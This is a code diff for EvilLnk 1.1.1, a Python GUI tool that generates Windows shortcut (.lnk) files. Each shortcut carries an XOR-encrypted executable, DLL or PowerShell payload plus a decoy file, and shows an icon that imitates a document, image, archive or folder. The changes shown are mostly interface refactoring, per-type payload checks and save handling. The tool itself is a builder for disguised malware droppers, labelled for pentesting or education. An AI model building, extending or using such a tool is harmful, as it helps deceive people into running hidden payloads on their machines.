@@ -144,11 +144,11 @@ filetype = '#replaceme'
 lnkfilename = 'example.lnk'
 hrlnkfilesize = '#replaceme'
 
-def xor_encrypt_payload_decoy(script_content, xor_key):
+def xor_encrypt_payload_decoy(filecontent, xor_key):
     try:
         def xor(data, key):
             return bytearray([a ^ ord(key) for a in data])
-        encrypted_content = xor(script_content, xor_key)
+        encrypted_content = xor(filecontent, xor_key)
         return encrypted_content
 
     except Exception as e:
@@ -194,7 +194,6 @@ def build_entry(name, is_dir):
 
 
 def write_lnk(lnk):
-
     with open(lnk.file, 'wb') as f:
         lnk.write(f)
 
@@ -262,6 +261,142 @@ def append_file(source, seek=None):
 
 
 class MainWindow(QWidget):
+    def __init__(self):
+        super().__init__()
+        self.setWindowTitle("EvilLnk")
+        self.setWindowIcon(QIcon("img/evillnk.png"))
+        layout = QVBoxLayout()
+        
+        menu_bar = QMenuBar()
+        evillnk_menu = menu_bar.addMenu("evillnk")
+        help_menu = menu_bar.addMenu("About")
+        homepage_action = QAction("Homepage", self)
+        evillnk_menu.addAction(homepage_action)
+        homepage_action.triggered.connect(self.homepage)
+        about_action = QAction("Overview", self)
+        help_menu.addAction(about_action)
+        about_action.triggered.connect(self.about)
+        layout.setMenuBar(menu_bar)
+        
+        payloadtype_layout = QHBoxLayout()
+        payload_type_label = QLabel("Payload Type:")
+        payloadtype_layout.addWidget(payload_type_label)
+        self.payload_type_input = QComboBox()
+        self.payload_type_input.addItem("Executable")
+        self.payload_type_input.addItem("Dynamic-link library")
+        self.payload_type_input.addItem("PowerShell Script")
+        self.payload_type_input.currentIndexChanged.connect(self.handle_payload_type_change)
+        payloadtype_layout.addWidget(self.payload_type_input)
+        layout.addLayout(payloadtype_layout)
+
+        payload_layout = QHBoxLayout()
+        payload_file_label = QLabel("Payload file:")
+        self.payload_file_input = QLineEdit()
+        self.payload_browse_button = QPushButton("Browse")
+        self.payload_browse_button.setFixedWidth(100)
+        self.payload_browse_button.clicked.connect(self.handle_payload_type_change)
+        payload_layout.addWidget(payload_file_label)
+        payload_layout.addWidget(self.payload_file_input)
+        payload_layout.addWidget(self.payload_browse_button)
+        layout.addLayout(payload_layout)
+
+        dll_ep_layout = QHBoxLayout()
+        self.dll_entrypoint_label = QLabel("DLL Entry Point:")
+        self.dll_entrypoint_input = QLineEdit()
+        self.dll_entrypoint_label.setVisible(False)
+        self.dll_entrypoint_input.setVisible(False)
+        dll_ep_layout.addWidget(self.dll_entrypoint_label)
+        dll_ep_layout.addWidget(self.dll_entrypoint_input)
+        layout.addLayout(dll_ep_layout)
+        
+        decoy_layout = QHBoxLayout()
+        decoy_file_label = QLabel("Decoy file:")
+        self.decoy_file_input = QLineEdit()
+        self.decoy_browse_button = QPushButton("Browse")
+        self.decoy_browse_button.setFixedWidth(100)
+        self.decoy_browse_button.clicked.connect(self.handle_payload_type_change)
+        decoy_layout.addWidget(decoy_file_label)
+        decoy_layout.addWidget(self.decoy_file_input)
+        decoy_layout.addWidget(self.decoy_browse_button)
+        layout.addLayout(decoy_layout)
+
+        buttons_and_icon_layout = QHBoxLayout()
+        displayicon_container = QWidget()
+        displayicon_layout = QVBoxLayout(displayicon_container)
+        displayicon_container.setStyleSheet("QWidget { border: 1px solid black; padding: 5px; }")
+        display_icon_label = QLabel("Display Icon:")
+        display_icon_label.setFixedWidth(290)
+        displayicon_layout.addWidget(display_icon_label)
+
+        buttons1_layout = QHBoxLayout()
+        self.doc_button = QRadioButton("DOC")
+        self.doc_button.setChecked(True)
+        self.txt_button = QRadioButton("TXT")
+        self.folder_button = QRadioButton("Folder")
+        buttons1_layout.addWidget(self.doc_button)
+        buttons1_layout.addWidget(self.txt_button)
+        buttons1_layout.addWidget(self.folder_button)
+        displayicon_layout.addLayout(buttons1_layout)
+
+        buttons2_layout = QHBoxLayout()
+        self.jpg_button = QRadioButton("JPG")
+        self.zip_button = QRadioButton("ZIP")
+        self.mp3_button = QRadioButton("MP3")
+        buttons2_layout.addWidget(self.jpg_button)
+        buttons2_layout.addWidget(self.zip_button)
+        buttons2_layout.addWidget(self.mp3_button)
+        displayicon_layout.addLayout(buttons2_layout)
+
+        icon_button_group = QButtonGroup()
+        icon_button_group.addButton(self.doc_button)
+        icon_button_group.addButton(self.txt_button)
+        icon_button_group.addButton(self.jpg_button)
+        icon_button_group.addButton(self.zip_button)
+        icon_button_group.addButton(self.folder_button)
+        icon_button_group.addButton(self.mp3_button)
+
+        buttons_and_icon_layout.addWidget(displayicon_container)
+
+        icon_preview_container = QWidget()
+        icon_preview_layout = QVBoxLayout(icon_preview_container)
+        icon_preview_container.setStyleSheet("QWidget { border: 1px solid black; padding: 5px; }")
+        icon_preview_label = QLabel("Icon Preview:")
+        icon_preview_layout.addWidget(icon_preview_label)
+
+        self.icon_display_label = QLabel()
+        icon_preview_layout.addWidget(self.icon_display_label)
+
+        buttons_and_icon_layout.addWidget(icon_preview_container)
+        layout.addLayout(buttons_and_icon_layout)
+
+        self.doc_button.toggled.connect(self.update_icon)
+        self.txt_button.toggled.connect(self.update_icon)
+        self.jpg_button.toggled.connect(self.update_icon)
+        self.zip_button.toggled.connect(self.update_icon)
+        self.folder_button.toggled.connect(self.update_icon)
+        self.mp3_button.toggled.connect(self.update_icon)
+        self.update_icon()
+
+        console_label = QLabel("Building Console")
+        layout.addWidget(console_label)
+        self.console = QTextEdit()
+        self.console.setMinimumSize(450, 150)
+        self.console.setReadOnly(True)
+        layout.addWidget(self.console)
+
+        generate_button = QPushButton("Generate")
+        generate_button.setFixedWidth(150)
+        generate_button.clicked.connect(self.generate_payload)
+        layout.addWidget(generate_button, alignment=Qt.AlignmentFlag.AlignHCenter)
+        
+        self.setLayout(layout)
+
+    def homepage(self):
+        QMessageBox.about(self, "Homepage", "evillnk Github repo:\n\nhttps://github.com/d1mov/evillnk")
+
+    def about(self):
+        QMessageBox.about(self, "About", "evillnk 1.1.1\n\nPython GUI based tool to generate lnk files with a payload and decoy files embedded inside.\nIt takes payload file and decoy file as input, converts them to xor encrypted bytes and append them at the end of the lnk file.\n\nTo be used for pentesting or educational purposes only.\n\nCoded by: v1k (Radostin Dimov)")
+        
     def update_icon(self):
         icon_size = 75
 
@@ -281,150 +416,6 @@ class MainWindow(QWidget):
         pixmap = pixmap.scaled(icon_size, icon_size)
         self.icon_display_label.setPixmap(pixmap)
 
-
-    def __init__(self):
-        super().__init__()
-        self.setWindowTitle("EvilLnk")
-        self.setWindowIcon(QIcon("img/evillnk.png"))
-        self.layout = QVBoxLayout()
-        
-        self.menu_bar = QMenuBar()
-        self.layout.setMenuBar(self.menu_bar)
-        self.evillnk_menu = self.menu_bar.addMenu("evillnk")
-        self.help_menu = self.menu_bar.addMenu("About")
-        
-        self.homepage_action = QAction("Homepage", self)
-        self.evillnk_menu.addAction(self.homepage_action)
-        self.homepage_action.triggered.connect(self.homepage)
-
-        self.about_action = QAction("Overview", self)
-        self.help_menu.addAction(self.about_action)
-        self.about_action.triggered.connect(self.about)
-        
-        payloadtype_layout = QHBoxLayout()
-        self.payload_type_label = QLabel("Payload Type:")
-        payloadtype_layout.addWidget(self.payload_type_label)
-        self.payload_type_input = QComboBox()
-        self.payload_type_input.addItem("Executable")
-        self.payload_type_input.addItem("Dynamic-link library")
-        self.payload_type_input.addItem("PowerShell Script")
-        self.payload_type_input.currentIndexChanged.connect(self.handle_payload_type_change)
-        payloadtype_layout.addWidget(self.payload_type_input)
-        self.layout.addLayout(payloadtype_layout)
-
-        payload_layout = QHBoxLayout()
-        self.payload_file_label = QLabel("Payload file:")
-        self.payload_file_input = QLineEdit()
-        self.payload_browse_button = QPushButton("Browse")
-        self.payload_browse_button.setFixedWidth(100)
-        self.payload_browse_button.clicked.connect(self.handle_payload_type_change)
-        payload_layout.addWidget(self.payload_file_label)
-        payload_layout.addWidget(self.payload_file_input)
-        payload_layout.addWidget(self.payload_browse_button)
-        self.layout.addLayout(payload_layout)
-
-        dll_ep_layout = QHBoxLayout()
-        self.dll_entrypoint_label = QLabel("DLL Entry Point:")
-        self.dll_entrypoint_input = QLineEdit()
-        self.dll_entrypoint_label.setVisible(False)
-        self.dll_entrypoint_input.setVisible(False)
-        dll_ep_layout.addWidget(self.dll_entrypoint_label)
-        dll_ep_layout.addWidget(self.dll_entrypoint_input)
-        self.layout.addLayout(dll_ep_layout)
-        
-        self.decoy_layout = QHBoxLayout()
-        self.decoy_file_label = QLabel("Decoy file:")
-        self.decoy_file_input = QLineEdit()
-        self.decoy_browse_button = QPushButton("Browse")
-        self.decoy_browse_button.setFixedWidth(100)
-        self.decoy_browse_button.clicked.connect(self.handle_payload_type_change)
-        self.decoy_layout.addWidget(self.decoy_file_label)
-        self.decoy_layout.addWidget(self.decoy_file_input)
-        self.decoy_layout.addWidget(self.decoy_browse_button)
-        self.layout.addLayout(self.decoy_layout)
-
-        buttons_and_icon_layout = QHBoxLayout()
-        displayicon_container = QWidget()
-        displayicon_layout = QVBoxLayout(displayicon_container)
-        displayicon_container.setStyleSheet("QWidget { border: 1px solid black; padding: 5px; }")
-        self.display_icon_label = QLabel("Display Icon:")
-        self.display_icon_label.setFixedWidth(290)
-        displayicon_layout.addWidget(self.display_icon_label)
-
-        radio_layout = QVBoxLayout()
-        top_row_layout = QHBoxLayout()
-        self.doc_button = QRadioButton("DOC")
-        self.doc_button.setChecked(True)
-        self.txt_button = QRadioButton("TXT")
-        self.folder_button = QRadioButton("Folder")
-        top_row_layout.addWidget(self.doc_button)
-        top_row_layout.addWidget(self.txt_button)
-        top_row_layout.addWidget(self.folder_button)
-
-        bottom_row_layout = QHBoxLayout()
-        self.jpg_button = QRadioButton("JPG")
-        self.zip_button = QRadioButton("ZIP")
-        self.mp3_button = QRadioButton("MP3")
-        bottom_row_layout.addWidget(self.jpg_button)
-        bottom_row_layout.addWidget(self.zip_button)
-        bottom_row_layout.addWidget(self.mp3_button)
-
-        radio_layout.addLayout(top_row_layout)
-        radio_layout.addLayout(bottom_row_layout)
-
-        self.icon_button_group = QButtonGroup()
-        self.icon_button_group.addButton(self.doc_button)
-        self.icon_button_group.addButton(self.txt_button)
-        self.icon_button_group.addButton(self.jpg_button)
-        self.icon_button_group.addButton(self.zip_button)
-        self.icon_button_group.addButton(self.folder_button)
-        self.icon_button_group.addButton(self.mp3_button)
-
-        displayicon_layout.addLayout(radio_layout)
-        buttons_and_icon_layout.addWidget(displayicon_container)
-
-        icon_preview_container = QWidget()
-        icon_preview_layout = QVBoxLayout(icon_preview_container)
-        icon_preview_container.setStyleSheet("QWidget { border: 1px solid black; padding: 5px; }")
-        icon_preview_label = QLabel("Icon Preview:")
-        icon_preview_layout.addWidget(icon_preview_label)
-
-        self.icon_display_label = QLabel()
-        icon_preview_layout.addWidget(self.icon_display_label)
-
-        buttons_and_icon_layout.addWidget(icon_preview_container)
-        self.layout.addLayout(buttons_and_icon_layout)
-        self.setLayout(self.layout)
-
-        self.doc_button.toggled.connect(self.update_icon)
-        self.txt_button.toggled.connect(self.update_icon)
-        self.jpg_button.toggled.connect(self.update_icon)
-        self.zip_button.toggled.connect(self.update_icon)
-        self.folder_button.toggled.connect(self.update_icon)
-        self.mp3_button.toggled.connect(self.update_icon)
-
-        self.update_icon()
-
-        self.console_label = QLabel("Building Console")
-        self.layout.addWidget(self.console_label)
-        self.console = QTextEdit()
-        self.console.setMinimumSize(450, 150)
-        self.console.setReadOnly(True)
-        self.layout.addWidget(self.console)
-
-        self.submit_button = QPushButton("Generate")
-        self.submit_button.setFixedWidth(150)
-        self.submit_button.clicked.connect(self.generate_payload)
-        self.layout.addWidget(self.submit_button, alignment=Qt.AlignmentFlag.AlignHCenter)
-        
-        self.setLayout(self.layout)
-
-    def homepage(self):
-        QMessageBox.about(self, "Homepage", "evillnk Github repo:\n\nhttps://github.com/d1mov/evillnk")
-
-    def about(self):
-        QMessageBox.about(self, "About", "evillnk 1.1\n\nPython GUI based tool to generate lnk files with a payload and decoy files embedded inside.\nIt takes payload file and decoy file as input, converts them to xor encrypted bytes and append them at the end of the lnk file.\n\nTo be used for pentesting or educational purposes only.\n\nCoded by: v1k (Radostin Dimov)")
-        
     def handle_payload_type_change(self, index):
         payload_type = self.payload_type_input.currentText()
         if payload_type == "Dynamic-link library":
@@ -434,17 +425,15 @@ class MainWindow(QWidget):
             self.dll_entrypoint_label.setVisible(False)
             self.dll_entrypoint_input.setVisible(False)
 
-        button = QObject.sender(self.payload_browse_button)
-        if button is self.payload_browse_button:
-            file_dialog = QFileDialog()
-            file_path, _ = file_dialog.getOpenFileName(self, "Select payload File")
+        bbutton1 = QObject.sender(self.payload_browse_button)
+        if bbutton1 is self.payload_browse_button:
+            file_path, _ = QFileDialog.getOpenFileName(self, "Select payload File")
             if file_path:
                 self.payload_file_input.setText(file_path)
 
-        button = QObject.sender(self.decoy_browse_button)
-        if button is self.decoy_browse_button:
-            file_dialog = QFileDialog()
-            file_path, _ = file_dialog.getOpenFileName(self, "Select decoy File")
+        bbutton2 = QObject.sender(self.decoy_browse_button)
+        if bbutton2 is self.decoy_browse_button:
+            file_path, _ = QFileDialog.getOpenFileName(self, "Select decoy File")
             if file_path:
                 self.decoy_file_input.setText(file_path)
 
@@ -455,6 +444,7 @@ class MainWindow(QWidget):
         global icon
         global icon_index
         global dllexec
+        global exeexec
         global filetype
         global hrlnkfilesize
         global lnkfilename
@@ -467,10 +457,18 @@ class MainWindow(QWidget):
         if not os.path.isfile(payload_file_input):
             self.console.append("[*] Specified Payload File does not exist!")
             return
-        valid_extensions = ('.ps1', '.exe', '.dll')
-        if not payload_file_input.lower().endswith(valid_extensions):
-            self.console.append("[*] Unsupported payload file type!")
-            return
+        if payload_type == "Executable":
+            if not payload_file_input.lower().endswith(".exe"):
+                self.console.append("[*] Input error! Payload type is: Executable")
+                return
+        if payload_type == "Dynamic-link library":
+            if not payload_file_input.lower().endswith(".dll"):
+                self.console.append("[*] Input error! Payload type is: Dynamic-link library")
+                return
+        if payload_type == "PowerShell Script":
+            if not payload_file_input.lower().endswith(".ps1"):
+                self.console.append("[*] Input error! Payload type is: PowerShell Script")
+                return
         if not decoy_file_input:
             self.console.append("[*] No Decoy File Specified!")
             return
@@ -578,7 +576,7 @@ class MainWindow(QWidget):
             self.console.append("[*] Lnk File Generated !")
             decoysource = 'decoy_enc'
             decoyseek = 0x3000
-            self.console.append(f"[*] Embedding decoy file")
+            self.console.append("[*] Embedding decoy file")
             append_file(decoysource, decoyseek)
             self.console.append(f"[*] Decoy start byte is: 0x{decoyseek:08x}")
             self.console.append(f"[*] Decoy end byte is: 0x{payload_start_byte - 1:08x}")
@@ -597,17 +595,19 @@ class MainWindow(QWidget):
             with open(lnkfilename, 'rb') as file:
                 lnkfilecontent = file.read()
             subprocess.run(['rm', lnkfilename])
-            output_file, _ = QFileDialog.getSaveFileName(self, "Save Output File", 'example.lnk', "lnk Files (*.lnk)")
-            if output_file:
-                with open(output_file, 'wb') as saved_file:
-                    saved_file.write(lnkfilecontent)
             self.console.append("[*] Cleaning Up...")
             subprocess.run(['rm', 'decoy_enc'])
             if payload_type != "PowerShell Script":
                 subprocess.run(['rm', 'payload_enc'])
             subprocess.run(['rm', 'loader_enc'])
-            self.console.append(f"[*] Done! Lnk file saved to {output_file}")
-            QMessageBox.about(self, "Success!", "Success! Lnk file generated and saved!")
+            output_file, _ = QFileDialog.getSaveFileName(self, "Save Output File", 'example.lnk', "lnk Files (*.lnk)")
+            if output_file:
+                with open(output_file, 'wb') as saved_file:
+                    saved_file.write(lnkfilecontent)
+                self.console.append(f"[*] Done! Lnk file saved to {output_file}")
+                QMessageBox.about(self, "Success!", "Success! Lnk file generated and saved!")
+            else:
+                self.console.append("[*] Lnk File saving canceled!")
         
         except ValueError as e:
             self.console.append(f"Error: {e}")
